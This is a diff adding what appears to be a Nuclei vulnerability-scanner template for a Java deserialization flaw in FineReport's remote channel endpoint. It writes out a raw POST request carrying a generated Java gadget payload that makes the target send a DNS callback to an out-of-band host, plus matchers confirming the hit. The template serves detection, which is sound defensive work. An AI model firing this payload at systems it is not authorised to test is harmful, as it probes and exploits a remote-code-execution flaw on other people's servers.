@@ -1,0 +1,36 @@
+id: finereport-remote-channel-deserialization
+info:
+  name: FineReport Remote Channel Java Deserialization Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects a deserialization vulnerability in FineReport's remote channel endpoint that can be exploited using Java gadgets for DNS out-of-band (OOB) interaction.
+  tags: rce,dnslog,deserialization
+
+variables:
+  reverse: "{{interactsh-url}}"
+  javaPayload: '{{generate_java_gadget("dns", reverse, "gzip")}}'
+
+http:
+  - raw:
+      - |
+        POST /webroot/decision/remote/design/channel HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+
+        {{javaPayload}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: regex
+        part: body
+        regex:
+          - "^\x1f\x8b\x08"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "</"
